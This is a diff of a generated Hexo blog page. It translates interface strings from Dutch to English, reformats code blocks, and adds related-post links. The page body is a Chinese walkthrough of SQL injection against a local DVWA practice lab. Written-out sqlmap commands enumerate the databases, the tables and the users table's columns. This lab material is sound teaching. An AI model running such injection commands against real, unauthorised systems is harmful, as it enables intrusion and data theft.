@@ -154,7 +154,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Zoeken">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -231,7 +231,8 @@
             </figure>
 <p>在kali上上启动sqlmap，由于我是虚拟机上运行的sqlmap，只需要将localhost换成主机IP即可</p>
 <p>开始注入url:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="lang-bash">sqlmap -u &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0&quot;
+</code></pre>
 <p>由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数—batch，来自动填写默认值。</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -242,7 +243,8 @@
             </figure>
 <p>得到数据库类型版本信息(mysql)，服务器类型版本信息(apache，php)</p>
 <p>用—dbs查看数据库名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch --dbs</span><br></pre></td></tr></table></figure>
+<pre><code class="lang-bash">sqlmap -u &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0&quot; --batch --dbs
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -252,7 +254,8 @@
             </figure>
 <p>得到6个数据库名</p>
 <p>用—D xxx查看指定数据库，—tables查看数据库中表信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch -D dvwa --tables</span><br></pre></td></tr></table></figure>
+<pre><code class="lang-bash">sqlmap -u &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0&quot; --batch -D dvwa --tables
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -262,7 +265,8 @@
             </figure>
 <p>得到了数据库dvwa的所有表名</p>
 <p>用—T xxx查看指定表，—columns查看表的列信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
+<pre><code class="lang-bash">sqlmap -u &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0&quot; --batch -D dvwa -T users --columns
+</code></pre>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -272,7 +276,7 @@
             </figure>
 <p>得到了数据库dvwa中表users的数据信息</p>
 <p>注入成功！</p>
-
+<div><strong>🚩推荐阅读</strong>（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）<ul><li><a href="https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/">DVWA-SQL_Injection_Blind（sql盲注）</a></li><li><a href="https://1187100546.github.io/2019/10/28/DVWA-SQL-Injection/">DVWA-SQL_Injection(SQL注入)</a></li><li><a href="https://1187100546.github.io/2019/10/12/简单sql注入环境搭建及注入/">简单sql注入环境搭建及注入</a></li><li><a href="https://e1sewhere.github.io/2019/03/18/我的WafBypass之道-三篇笔记/">我的WafBypass之道 三篇笔记</a></li><li><a href="https://e1sewhere.github.io/2019/02/12/SQL注入脚本练习/">SQL注入脚本练习</a></li></ul></div>
         </div>
 
         <blockquote class="post-copyright">
@@ -280,7 +284,7 @@
     <div class="content">
         
 <span class="post-time">
-    Laatste update: <time datetime="2019-11-09T07:44:17.016Z" itemprop="dateUpdated">2019-11-09 15:44:17</time>
+    Last updated: <time datetime="2019-11-09T07:44:17.016Z" itemprop="dateUpdated">2019-11-09 15:44:17</time>
 </span><br>
 
 
@@ -459,7 +463,7 @@
                     </span>
                     
                         <span>
-                            Deze blog valt onder de <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International Licentie</a>.
+                            This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
                         </span>
             </p>
     </div>
